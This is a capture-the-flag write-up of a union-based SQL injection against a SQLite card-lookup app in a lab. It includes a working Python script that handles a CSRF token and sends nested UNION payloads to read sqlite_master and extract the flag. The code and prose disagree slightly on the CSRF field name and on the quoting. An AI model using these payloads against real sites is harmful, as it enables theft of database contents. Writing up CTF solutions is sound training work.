---
title: "SQLi Cards — Union Injection into SQLite"
date: 2026-02-28
categories: ["Olicyber"]
series: ["Territoriale 2026 Demo"]
tags: ["web", "sqli", "union-injection", "sqlite", "sqlite-master"]
difficulty: "intermediate"
summary: "Union-based SQL injection in a card lookup form to enumerate tables via sqlite_master and extract the flag."
---

## The Challenge

A web application presents a card lookup form that POSTs a `card_id` parameter. The backend directly interpolates `card_id` into a SQLite query with no parameterization. The flag is stored in a separate table not reachable through the normal UI.

## Approach

I opened the app and tried submitting a card ID of `1`. Got a result. Tried `1'` — server error. Classic string injection point.

The first thing I wanted was the table schema. I tried a simple `UNION SELECT NULL,NULL--` to probe the column count — it errored. Added more NULLs one by one: three didn't work either. Looking at the HTML response I noticed there was also a CSRF token being checked, which my manual curl requests were missing. I had to script the extraction to also grab and forward the CSRF token with each POST.

Once the CSRF flow was handled in `extract_data()`, the actual injection worked. The payload structure is nested because the app escapes single quotes in a non-standard way, so I had to use a double-union trick to actually get the inner query to evaluate. I first retrieved the schema of the `flag` table from `sqlite_master`, confirmed the column was named `flag`, then extracted the value.

## Solution

```python
import requests
import re

url = "http://10.45.1.2:4003/"

def extract_csrf(html):
    match = re.search(r'name="csrf_token"\s+value="([^"]+)"', html)
    if match:
        return match.group(1)
    return None

def extract_data(payload):
    session = requests.Session()
    r = session.get(url, timeout=5)
    csrf = extract_csrf(r.text)
    if not csrf:
        return "Failed CSRF"
    
    data = {'card_id': payload, 'csrf': csrf}
    r2 = session.post(url, data=data, timeout=5)
    
    res = re.search(r'<p><strong>Username:</strong>\s*(.*?)</p>', r2.text)
    if res:
        return res.group(1)
    return "Error/No Match: " + r2.text[:200]

# Extract schema of flag table
schema_payload = "' UNION SELECT '999'' UNION SELECT 1, (SELECT sql FROM sqlite_master WHERE name=''flag''), 3, 4 -- -' -- -"
print("Flag Schema:", extract_data(schema_payload))

# Try guessing column 'flag'
flag_payload = "' UNION SELECT '999'' UNION SELECT 1, (SELECT flag FROM flag LIMIT 1), 3, 4 -- -' -- -"
print("Flag Value:", extract_data(flag_payload))

#  flag{let_m3_1n!_058a91e6}
```

## What I Learned

Union-based injection in SQLite is slightly more forgiving than MySQL — you can use double quotes for string literals which sidesteps some quoting escapes. `sqlite_master` is always the first place to look when you need the database schema, and it's always accessible to any SQL query that runs.
